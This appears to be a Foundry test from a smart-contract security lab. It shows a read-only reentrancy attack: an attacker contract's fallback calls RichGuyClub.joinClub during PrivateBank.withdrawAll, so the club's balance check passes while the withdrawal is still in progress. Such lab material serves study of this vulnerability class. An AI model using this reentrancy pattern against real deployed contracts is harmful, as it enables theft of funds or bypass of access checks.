//SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../../src/Reentrancy/ReadonlyReentrancy/PrivateBank.sol";
import "../../src/Reentrancy/ReadonlyReentrancy/RichGuyClub.sol";

contract ReadOnlyAttack is Test {
    PrivateBank bank;
    RichGuyClub club;
    Exp exp;

    function setUp() public {
        bank = new PrivateBank();
        club = new RichGuyClub(address(bank));
        exp = new Exp(address(club), address(bank));
        vm.deal(address(exp), 1000 ether);
    }

    function testReadOnlyAttack() public {
        exp.exploit();
        assertTrue(club.richguy(address(exp)));
    }
}

contract Exp {
    PrivateBank bank;

    RichGuyClub club;

    constructor(address _club, address _bank) {
        bank = PrivateBank(_bank);
        club = RichGuyClub(_club);
    }

    function exploit() public {
        bank.deposit{value: 1000 ether}();
        bank.withdrawAll();
    }

    fallback() external payable {
        club.joinClub();
    }
}
